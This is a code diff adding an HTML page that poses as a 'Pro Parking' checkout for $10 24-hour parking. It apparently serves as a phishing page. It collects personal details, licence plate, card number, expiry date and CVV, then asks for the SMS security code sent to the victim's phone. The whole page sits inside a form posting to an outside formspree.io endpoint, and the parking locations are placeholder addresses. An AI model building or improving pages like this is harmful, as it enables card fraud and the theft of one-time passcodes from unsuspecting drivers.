@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<form 
+action="https://formspree.io/f/xwpejdgd"
+method="POST"
+>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surveyer</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e1e1e, #333);
+            color: #e0e0e0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden; /* Hide the scrollbar for the body */
+            text-align: center;
+        }
+        .background-video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Ensure the video covers the entire viewport */
+            z-index: -1; /* Place behind other content */
+        }
+        .wrapper {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto; /* Allow scrolling */
+            padding: 20px;
+            box-sizing: border-box;
+            background-color: rgba(255, 255, 255, 0,8);
+            border-radius: 8px; 
+        }
+        .container, .security-code, #thankYou {
+            position: relative;
+            width: 100%;
+            max-width: 800px; /* Ensure it fits well on large screens */
+            margin: 0 auto;
+            box-sizing: border-box;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+        .container {
+            background: rgba(30, 30, 30, 0.9);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 40px rgba(0,0,0,0.8);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            max-height: 90vh; /* Ensure it fits within the viewport */
+            overflow-y: auto; /* Allow scrolling */
+        }
+        h1 {
+            color: #00bcd4;
+            margin-bottom: 30px;
+            font-size: 32px;
+            font-weight: 700;
+            text-shadow: 0 0 10px rgba(0, 188, 212, 0.5);
+            position: relative; /* Position relative for better control */
+            width: 100%;
+            margin-top: 20px; /* Add margin to ensure it's not overlapping */
+        }
+        .form-group {
+            margin-bottom: 25px;
+            width: 100%;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #00bcd4;
+            font-size: 16px;
+        }
+        .form-group input, .form-group select, .form-group textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #444;
+            border-radius: 12px;
+            background: #2c2c2c;
+            color: #e0e0e0;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
+            border-color: #00bcd4;
+            box-shadow: 0 0 12px rgba(0, 188, 212, 0.7);
+            outline: none;
+            background: #333;
+        }
+        .form-group .section {
+            background: #1f1f1f;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+        }
+        .form-group .section label {
+            color: #e0e0e0;
+            font-size: 16px;
+        }
+        .form-group .section input {
+            padding: 12px;
+            border: none;
+            background: #333;
+        }
+        .form-group .section .row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        .form-group .section .row input {
+            flex: 1;
+            min-width: 0;
+        }
+        .form-group .section .row input:first-child {
+            flex: 2;
+        }
+        button {
+            background: #4caf50; /* Green */
+            color: #fff;
+            border: none;
+            padding: 15px;
+            font-size: 18px;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+        }
+        button:hover {
+            background-color: #45a049;
+            transform: scale(1.05);
+        }
+        button:active {
+            background-color: #388e3c;
+            transform: scale(0.98);
+        }
+        .security-code, #thankYou {
+            display: none;
+        }
+        .security-code.active, #thankYou.active {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .security-code {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 40px rgba(0,0,0,0.8);
+            max-width: 90%;
+            width: 80%;
+            max-height: 70vh;
+            overflow-y: auto;
+            color: #e0e0e0;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .security-code p {
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        .security-code input {
+            padding: 15px;
+            font-size: 18px;
+            border-radius: 12px;
+            border: 1px solid #444;
+            background: #333;
+            color: #e0e0e0;
+            width: calc(100% - 24px);
+        }
+        .security-code button {
+            background: #2196f3; /* Blue */
+            color: #fff;
+            border: none;
+            padding: 15px;
+            font-size: 18px;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+        }
+        .security-code button:hover {
+            background-color: #1976d2;
+            transform: scale(1.05);
+        }
+        .security-code button:active {
+            background-color: #1565c0;
+            transform: scale(0.98);
+        }
+        #thankYou {
+            background: #000;
+            color: #FFFF00; /* Yellow color */
+            text-align: center;
+            padding: 30px;
+            font-size: 26px;
+            font-weight: 700;
+            border-radius: 15px;
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.4);
+            width: 80%;
+            max-width: 600px;
+        }
+        @media (max-width: 600px) {
+            .container, .security-code {
+                width: 95%;
+                padding: 20px;
+            }
+            h1 {
+                font-size: 28px;
+            }
+            button {
+                font-size: 16px;
+                padding: 12px;
+            }
+            .form-group input, .form-group select, .form-group textarea {
+                font-size: 14px;
+            }
+            .security-code input {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <video class="background-video" autoplay muted loop>
+        <source src="C:\Users\comptant.com\Desktop\testingproject\videoloop.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="wrapper">
+        <!-- Initial Form -->
+        <div class="container">
+            <h1>Welcome to Pro Parking!</h1>
+            <h2>24-Hours of parking with only $10</h2>
+            <h3>Complete the information presented below now!</h3>
+            <form id="form" action="javascript:void(0);">
+                <div class="form-group">
+                    <label for="firstName">First Name</label>
+                    <input type="text" id="firstName" name="firstName" required>
+                </div>
+                <div class="form-group">
+                    <label for="lastName">Last Name</label>
+                    <input type="text" id="lastName" name="lastName" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" required>
+                </div>
+                <div class="form-group">
+                    <div class="section">
+                        <label for="licensePlate">License Plate Required</label>
+                        <input type="text" id="licensePlate" name="licensePlate" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <div class="section">
+                        <label>Payment Method</label>
+                        <div class="row">
+                            <input type="text" placeholder="Card Number" required>
+                        </div>
+                        <div class="row">
+                            <input type="text" placeholder="Expiration Date" required>
+                            <input type="text" placeholder="CVV" required>
+                        </div>
+                        <div class="row">
+                            <input type="text" placeholder="Postal Code" required>
+                        </div>
+                        <div class="section">
+                            <label>+ Add Promo Code</label>
+                            <input type="text" placeholder="Promo Code">
+                        </div>
+                        <div class="section">
+                            <label>Choose Country</label>
+                            <select id="country" required>
+                                <option value="">Select Country</option>
+                                <option value="USA">USA</option>
+                                <option value="Canada">Canada</option>
+                            </select>
+                        </div>
+                        <div class="section">
+                            <label>Choose Province</label>
+                            <select id="province" required>
+                                <option value="">Select Province</option>
+                            </select>
+                        </div>
+                        <div class="section">
+                            <label>Choose Parking Location</label>
+                            <select id="location" required>
+                                <option value="">Select Location</option>
+                            </select>
+                        </div>
+                        <div class="section">
+                            <label>Your Order Total</label>
+                            <div>Base Price Parking Fee 24-Hours •$10.00•</div>
+                            <div>Service Fee 24-Hours •$3.50•</div>
+                            <div>Total Charge •$13.50•</div>
+                            <div>× No Cancellation : This booking will start immediately ×</div>
+                            <div>✔Secure Encrypted Checkout✔</div>
+                        </div>
+                    </div>
+                </div>
+                <button id="completePurchase1">Complete Purchase</button>
+            </form>
+        </div>
+
+        <!-- Phase 2: Security Code Input -->
+        <div class="security-code" id="securityCode">
+            <p>Please provide the security code sent to your phone number to confirm purchase. Allow a few moments to receive it.</p>
+            <input type="text" id="securityCodeInput" placeholder="Security Code" required>
+            <button id="submitSecurityCode">Complete Purchase</button>
+        </div>
+
+        <!-- Thank You Message -->
+        <div id="thankYou">
+            Thanks for submitting! If payment was successful the parking purchase confirmation and your receipt will be sent to your email. Please allow a few moments to receive it and check your spam folder. Contact support@proparking.com for support if necessary.
+        </div>
+    </div>
+
+<script>
+        const provinces = {
+            USA: [
+                'California', 'New York', 'Texas', 'Florida', 'Illinois', 'Ohio', 'Georgia', 'Michigan', 'North Carolina', 'New Jersey'
+            ],
+            Canada: [
+                'Ontario', 'Quebec', 'British Columbia', 'Alberta', 'Manitoba', 'Saskatchewan', 'Nova Scotia', 'New Brunswick', 'Prince Edward Island', 'Newfoundland and Labrador'
+            ]
+        };
+
+        const locations = {
+            'California': [
+                '1234 Sunset Blvd, Los Angeles, CA 90026',
+                '5678 Hollywood Blvd, Los Angeles, CA 90028',
+                '9101 Vine St, Los Angeles, CA 90038',
+                '123 Main St, San Francisco, CA 94105',
+                '456 Market St, San Francisco, CA 94103',
+                '789 King St, San Diego, CA 92101',
+                '1011 Broadway, Oakland, CA 94607',
+                '1213 Melrose Ave, Los Angeles, CA 90046',
+                '1415 Wilshire Blvd, Santa Monica, CA 90403',
+                '1617 Ventura Blvd, Studio City, CA 91604'
+            ],
+            'New York': [
+                '1 Times Square, New York, NY 10036',
+                '2 Broadway, New York, NY 10004',
+                '3 Wall St, New York, NY 10005',
+                '4 Fifth Ave, New York, NY 10010',
+                '5 Madison Ave, New York, NY 10022',
+                '6 Columbus Circle, New York, NY 10019',
+                '7 34th St, New York, NY 10001',
+                '8 Grand Central Terminal, New York, NY 10017',
+                '9 Battery Park, New York, NY 10004',
+                '10 Lincoln Center, New York, NY 10023'
+            ],
+            'Texas': [
+                '123 Main St, Houston, TX 77002',
+                '456 Elm St, Dallas, TX 75201',
+                '789 Oak St, Austin, TX 73301',
+                '1011 Maple St, San Antonio, TX 78205',
+                '1213 Pine St, Fort Worth, TX 76102',
+                '1415 Cedar St, Arlington, TX 76010',
+                '1617 Birch St, Plano, TX 75074',
+                '1819 Willow St, Irving, TX 75060',
+                '2021 Spruce St, McKinney, TX 75069',
+                '2223 Fir St, Frisco, TX 75034'
+            ],
+            'Florida': [
+                '123 Ocean Dr, Miami, FL 33139',
+                '456 Collins Ave, Miami Beach, FL 33139',
+                '789 Flagler St, Miami, FL 33131',
+                '1011 Bay St, Tampa, FL 33602',
+                '1213 1st Ave, Orlando, FL 32801',
+                '1415 Orange Ave, Orlando, FL 32806',
+                '1617 Park Ave, Jacksonville, FL 32205',
+                '1819 4th St, St. Petersburg, FL 33701',
+                '2021 Atlantic Blvd, Fort Lauderdale, FL 33304',
+                '2223 5th Ave, Gainesville, FL 32601'
+            ],
+            'Illinois': [
+                '1 Wacker Dr, Chicago, IL 60601',
+                '2 Michigan Ave, Chicago, IL 60603',
+                '3 State St, Chicago, IL 60605',
+                '4 Dearborn St, Chicago, IL 60611',
+                '5 Wells St, Chicago, IL 60654',
+                '6 Clark St, Chicago, IL 60640',
+                '7 Halsted St, Chicago, IL 60614',
+                '8 Division St, Chicago, IL 60622',
+                '9 Lincoln Ave, Chicago, IL 60614',
+                '10 Milwaukee Ave, Chicago, IL 60647'
+            ],
+            'Ohio': [
+                '1 High St, Columbus, OH 43215',
+                '2 Broad St, Columbus, OH 43205',
+                '3 Main St, Cleveland, OH 44114',
+                '4 Euclid Ave, Cleveland, OH 44115',
+                '5 5th Ave, Cincinnati, OH 45202',
+                '6 Vine St, Cincinnati, OH 45202',
+                '7 6th St, Dayton, OH 45402',
+                '8 3rd St, Akron, OH 44308',
+                '9 Front St, Toledo, OH 43604',
+                '10 Summit St, Toledo, OH 43605'
+            ],
+            'Michigan': [
+                '1 Woodward Ave, Detroit, MI 48201',
+                '2 Jefferson Ave, Detroit, MI 48226',
+                '3 Grand River Ave, Detroit, MI 48226',
+                '4 Michigan Ave, Detroit, MI 48226',
+                '5 Fort St, Detroit, MI 48226',
+                '6 Washington Blvd, Detroit, MI 48226',
+                '7 Livernois Ave, Detroit, MI 48221',
+                '8 Seven Mile Rd, Detroit, MI 48221',
+                '9 8 Mile Rd, Detroit, MI 48221',
+                '10 Telegraph Rd, Detroit, MI 48224'
+            ],
+            'North Carolina': [
+                '1 Trade St, Charlotte, NC 28202',
+                '2 Tryon St, Charlotte, NC 28203',
+                '3 Elm St, Greensboro, NC 27401',
+                '4 Market St, Wilmington, NC 28401',
+                '5 Main St, Raleigh, NC 27601',
+                '6 Capitol Blvd, Raleigh, NC 27601',
+                '7 5th Ave, Durham, NC 27701',
+                '8 9th St, Durham, NC 27701',
+                '9 College St, Asheville, NC 28801',
+                '10 Broadway St, Asheville, NC 28801'
+            ],
+            'Georgia': [
+                '1 Peachtree St, Atlanta, GA 30303',
+                '2 Piedmont Ave, Atlanta, GA 30309',
+                '3 North Ave, Atlanta, GA 30332',
+                '4 Edgewood Ave, Atlanta, GA 30307',
+                '5 Decatur St, Atlanta, GA 30316',
+                '6 Buford Hwy, Atlanta, GA 30329',
+                '7 Howell Mill Rd, Atlanta, GA 30318',
+                '8 Mitchell St, Atlanta, GA 30315',
+                '9 Candler Rd, Atlanta, GA 30331',
+                '10 Lavista Rd, Atlanta, GA 30324'
+            ],
+            'New Jersey': [
+                '1 Broad St, Newark, NJ 07102',
+                '2 Market St, Newark, NJ 07102',
+                '3 Morris Ave, Elizabeth, NJ 07201',
+                '4 Washington Ave, Paterson, NJ 07501',
+                '5 Main St, Hoboken, NJ 07030',
+                '6 Jersey Ave, New Brunswick, NJ 08901',
+                '7 King St, Trenton, NJ 08608',
+                '8 River Rd, Parsippany, NJ 07054',
+                '9 Route 46, Clifton, NJ 07013',
+                '10 Route 22, Bridgewater, NJ 08807'
+            ],
+            'Ontario': [
+                '1 Queen St W, Toronto, ON M5H 2N2',
+                '2 King St W, Toronto, ON M5H 1A1',
+                '3 Bay St, Toronto, ON M5J 2N8',
+                '4 Front St W, Toronto, ON M5J 1E6',
+                '5 Dundas St W, Toronto, ON M5G 1Z8',
+                '6 Yonge St, Toronto, ON M4Y 1Z2',
+                '7 College St, Toronto, ON M5T 1R7',
+                '8 Spadina Ave, Toronto, ON M5T 2G8',
+                '9 Bloor St W, Toronto, ON M5S 1Y3',
+                '10 Bathurst St, Toronto, ON M5T 1P9'
+            ],
+            'Quebec': [
+                '1 St-Catherine St W, Montreal, QC H3B 1L4',
+                '2 René-Lévesque Blvd W, Montreal, QC H3B 1X8',
+                '3 Crescent St, Montreal, QC H3G 2B1',
+                '4 Sherbrooke St W, Montreal, QC H3A 1E5',
+                '5 Peel St, Montreal, QC H3C 2P9',
+                '6 Notre-Dame St W, Montreal, QC H3J 1N9',
+                '7 McGill College Ave, Montreal, QC H3A 1A1',
+                '8 Viger Ave E, Montreal, QC H2V 4A1',
+                '9 Atwater Ave, Montreal, QC H3H 1Y6',
+                '10 Papineau Ave, Montreal, QC H2K 4R6'
+            ],
+            'British Columbia': [
+                '1 Granville St, Vancouver, BC V6C 1T1',
+                '2 Robson St, Vancouver, BC V6B 2B7',
+                '3 Georgia St W, Vancouver, BC V6E 4A2',
+                '4 Main St, Vancouver, BC V6A 2V5',
+                '5 Pender St W, Vancouver, BC V6A 1T9',
+                '6 Broadway Ave, Vancouver, BC V5Z 1J7',
+                '7 Cambie St, Vancouver, BC V5Z 4L9',
+                '8 Davie St, Vancouver, BC V6E 4H7',
+                '9 Alberni St, Vancouver, BC V6G 3C5',
+                '10 Kingsway Ave, Vancouver, BC V5N 4Z8'
+            ],
+            'Alberta': [
+                '1 Jasper Ave, Edmonton, AB T5J 2A2',
+                '2 Whyte Ave, Edmonton, AB T6E 1Z4',
+                '3 104 St NW, Edmonton, AB T5J 1X1',
+                '4 17 Ave SW, Calgary, AB T2S 0B1',
+                '5 8 St SW, Calgary, AB T2P 1A1',
+                '6 14 St NW, Calgary, AB T2N 1Z7',
+                '7 Macleod Trail, Calgary, AB T2G 4W8',
+                '8 32 Ave NW, Calgary, AB T2K 0A8',
+                '9 1 St SW, Calgary, AB T2P 4K9',
+                '10 4 St SW, Calgary, AB T2P 1X1'
+            ],
+            'Manitoba': [
+                '1 Portage Ave, Winnipeg, MB R3B 3N4',
+                '2 Main St, Winnipeg, MB R3B 1E2',
+                '3 Pembina Hwy, Winnipeg, MB R3T 2G8',
+                '4 Osborne St, Winnipeg, MB R3L 1Y6',
+                '5 Broadway Ave, Winnipeg, MB R3C 0A2',
+                '6 Notre Dame Ave, Winnipeg, MB R3B 1P4',
+                '7 Waverley St, Winnipeg, MB R3T 5J4',
+                '8 McPhillips St, Winnipeg, MB R2X 2W8',
+                '9 Ellice Ave, Winnipeg, MB R3G 0B2',
+                '10 Marion St, Winnipeg, MB R2H 0T6'
+            ],
+            'Saskatchewan': [
+                '1 Albert St, Regina, SK S4P 2V2',
+                '2 Broad St, Regina, SK S4P 1X6',
+                '3 Victoria Ave, Regina, SK S4N 0P5',
+                '4 21st St E, Saskatoon, SK S7K 0B4',
+                '5 Idylwyld Dr N, Saskatoon, SK S7L 0Z6',
+                '6 2nd Ave N, Saskatoon, SK S7K 2B7',
+                '7 Circle Dr W, Saskatoon, SK S7L 6W6',
+                '8 8th St E, Saskatoon, SK S7H 0A6',
+                '9 33rd St W, Saskatoon, SK S7L 0V5',
+                '10 45th St W, Saskatoon, SK S7L 5V8'
+            ],
+            'Nova Scotia': [
+                '1 Spring Garden Rd, Halifax, NS B3H 4M5',
+                '2 Barrington St, Halifax, NS B3J 1R6',
+                '3 Quinpool Rd, Halifax, NS B3L 1A3',
+                '4 Hollis St, Halifax, NS B3J 1V2',
+                '5 Dresden Row, Halifax, NS B3J 2B2',
+                '6 Agricola St, Halifax, NS B3M 1X1',
+                '7 Gottingen St, Halifax, NS B3J 1C3',
+                '8 South Park St, Halifax, NS B3H 1P3',
+                '9 Brenton St, Halifax, NS B3J 2N8',
+                '10 Young St, Halifax, NS B3K 2A5'
+            ],
+            'New Brunswick': [
+                '1 King St, Fredericton, NB E3B 1B6',
+                '2 Queen St, Fredericton, NB E3B 1B7',
+                '3 George St, Fredericton, NB E3B 1B5',
+                '4 Main St, Saint John, NB E2L 1K7',
+                '5 Market Sq, Saint John, NB E2L 4Z6',
+                '6 Water St, Saint John, NB E2L 3P8',
+                '7 Prince William St, Saint John, NB E2L 1M4',
+                '8 King St, Saint John, NB E2L 1H4',
+                '9 Rothesay Ave, Saint John, NB E2H 2G1',
+                '10 Sandy Point Rd, Saint John, NB E2K 5W8'
+            ],
+            'Prince Edward Island': [
+                '1 Queen St, Charlottetown, PE C1A 4A1',
+                '2 Great George St, Charlottetown, PE C1A 4J5',
+                '3 Kent St, Charlottetown, PE C1A 1N4',
+                '4 University Ave, Charlottetown, PE C1A 4P3',
+                '5 Richmond St, Charlottetown, PE C1A 1H5',
+                '6 Victoria Row, Charlottetown, PE C1A 4A8',
+                '7 Grafton St, Charlottetown, PE C1A 1L7',
+                '8 Hillsborough St, Charlottetown, PE C1A 1W2',
+                '9 West St, Charlottetown, PE C1A 4R4',
+                '10 St. Peters Rd, Charlottetown, PE C1A 5W7'
+            ],
+            'Newfoundland and Labrador': [
+                '1 Water St, St. John\'s, NL A1C 1A1',
+                '2 Duckworth St, St. John\'s, NL A1C 1J3',
+                '3 George St, St. John\'s, NL A1E 1R6',
+                '4 Bond St, St. John\'s, NL A1E 1S6',
+                '5 Patrick St, St. John\'s, NL A1C 2C4',
+                '6 Queens Rd, St. John\'s, NL A1C 2A8',
+                '7 Commonwealth Ave, St. John\'s, NL A1A 1H7',
+                '8 Logy Bay Rd, St. John\'s, NL A1A 1N8',
+                '9 The Boulevard, St. John\'s, NL A1A 3N2',
+                '10 Torbay Rd, St. John\'s, NL A1A 2J4'
+            ]
+        };
+
+        function populateProvinces() {
+            const country = document.getElementById('country').value;
+            const provinceSelect = document.getElementById('province');
+            provinceSelect.innerHTML = '<option value="">Select Province</option>';
+
+            if (country) {
+                provinces[country].forEach(province => {
+                    const option = document.createElement('option');
+                    option.value = province;
+                    option.textContent = province;
+                    provinceSelect.appendChild(option);
+                });
+            }
+        }
+
+        function populateLocations() {
+            const province = document.getElementById('province').value;
+            const locationSelect = document.getElementById('location');
+            locationSelect.innerHTML = '<option value="">Select Location</option>';
+
+            if (province) {
+                locations[province].forEach(location => {
+                    const option = document.createElement('option');
+                    option.value = location;
+                    option.textContent = location;
+                    locationSelect.appendChild(option);
+                });
+            }
+        }
+
+        document.getElementById('country').addEventListener('change', () => {
+            populateProvinces();
+            document.getElementById('province').value = '';
+            document.getElementById('location').innerHTML = '<option value="">Select Location</option>';
+        });
+
+        document.getElementById('province').addEventListener('change', populateLocations);
+
+        document.getElementById('completePurchase1').addEventListener('click', () => {
+            const country = document.getElementById('country').value;
+            const province = document.getElementById('province').value;
+            if (country && province) {
+                document.querySelector('.container').style.display = 'none';
+                document.getElementById('securityCode').classList.add('active');
+            } else {
+                alert('Please select both country and province.');
+            }
+        });
+
+        document.getElementById('submitSecurityCode').addEventListener('click', () => {
+            const securityCode = document.getElementById('securityCodeInput').value;
+            if (securityCode) {
+                document.getElementById('securityCode').style.display = 'none';
+                document.getElementById('thankYou').classList.add('active');
+            } else {
+                alert('Please enter the security code.');
+            }
+        });
+    </script>
+</body>
+</form>
+</html>
